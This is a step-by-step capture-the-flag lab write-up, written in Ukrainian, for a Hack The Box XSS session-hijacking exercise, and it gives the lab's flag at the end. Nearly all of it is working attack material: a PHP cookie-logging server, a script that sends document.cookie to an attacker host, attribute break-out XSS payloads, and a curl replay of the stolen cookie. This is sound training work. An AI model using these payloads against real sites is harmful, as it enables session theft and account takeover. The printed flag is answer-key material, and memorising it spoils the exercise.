## XSS — Session Hijacking

**Модуль:** [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/app/module/103)
**Секція:** [Session Hijacking](https://academy.hackthebox.com/app/module/103/section/1008)
**Ціль:** `10.129.X.X/hijacking/`
**Де запускати сервер:** HTB Pwnbox (або Kali підключений через VPN з tun0)

## Крок 1 — Підготовка серверної директорії

```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
```

Створюємо `index.php`:

```bash
cat > /tmp/tmpserver/index.php << 'EOF'
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
EOF
```

Створюємо `script.js`:

```bash
cat > /tmp/tmpserver/script.js << 'EOF'
new Image().src='http://OUR_IP:8080/index.php?c='+document.cookie;
EOF
```

> Замінити `OUR_IP` на реальний `tun0` IP з `ip a show tun0`.

Перевіряємо:
```bash
ls /tmp/tmpserver/
# index.php  script.js
```

***

## Крок 2 — Запуск PHP сервера

```bash
sudo php -S 0.0.0.0:8080 -t /tmp/tmpserver/
```

***

## Крок 3 — Detection: знаходимо вразливе поле

Відкриваємо `http://TARGET_IP/hijacking/` — форма реєстрації. Тестуємо **по одному полю** з назвою поля як шляхом:

```
Full Name:  "><script src=http://OUR_IP/fullname></script>
Username:   "><script src=http://OUR_IP/username></script>
Password:   123456
Email:      test@test.com
Image URL:  "><script src=http://OUR_IP/imgurl></script>
```

> **Ключовий момент:** payload починається з `">` — це break-out з HTML атрибута `value=""`.

Відправляємо → чекаємо ~30 секунд → дивимось у термінал PHP сервера:

```
[INFO] 10.129.X.X GET /imgurl
```

**Вразливе поле: `imgurl`** (Image URL).

***

## Крок 4 — Відправка cookie-stealing payload

Реєструємось знову (новий email):

```
Full Name:  anything
Username:   anything2
Password:   123456
Email:      test2@test.com
Image URL:  "><script src=http://OUR_IP/script.js></script>
```

***

## Крок 5 — Отримуємо cookie

У PHP терміналі побачимо два запити:

```
[INFO] GET /script.js
[INFO] GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
```

Читаємо файл:

```bash
cat /tmp/tmpserver/cookies.txt
# Victim IP: 10.129.X.X | Cookie: cookie=c00k1355h0u1d8353cu23d
```

***

## Крок 6 — Встановлюємо cookie і логінимось

```bash
curl -s http://TARGET_IP/hijacking/login.php \
  -b "cookie=c00k1355h0u1d8353cu23d" | grep -i "HTB{"
```

***

## Прапор

```
HTB{4lw4y5_53cur3_y0ur_c00k135}
```
